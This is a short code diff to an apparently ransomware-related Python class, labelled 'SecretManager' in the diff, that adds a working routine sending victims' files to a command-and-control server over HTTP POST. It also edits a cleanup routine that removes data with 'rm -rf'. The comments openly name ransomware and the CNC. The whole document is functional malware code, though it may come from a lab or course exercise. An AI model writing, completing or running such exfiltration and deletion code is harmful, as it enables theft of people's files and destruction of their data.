@@ -156,11 +156,21 @@ class SecretManager:
 
     def clean(self, install_path) -> None:
         # remove ransomware and crypto data from the target
-        system(f"rm -rf {self._path}")
+        system(f"rm -rf {self._path}/token")
         system(f"rm -rf {install_path}")
     
         return None
 
     def leak_files(self, files: List[str]) -> None:
         # send file, genuine path and token to the CNC
-        raise NotImplemented()
+        dir_label = self.get_hex_token()
+        folder_url = f"http://{self._remote_host_port}/file?label={dir_label}"
+        header = {
+                "Content-Type":"application/octet-stream"
+                }
+        for file in files:
+            file_url = f"{folder_url}&file_name={file.rsplit('/', 1)[-1]}"
+            with open(f'{file}', 'rb') as f:
+                requests.post(file_url, files={f'f': f}, headers=header)
+        
+        return None
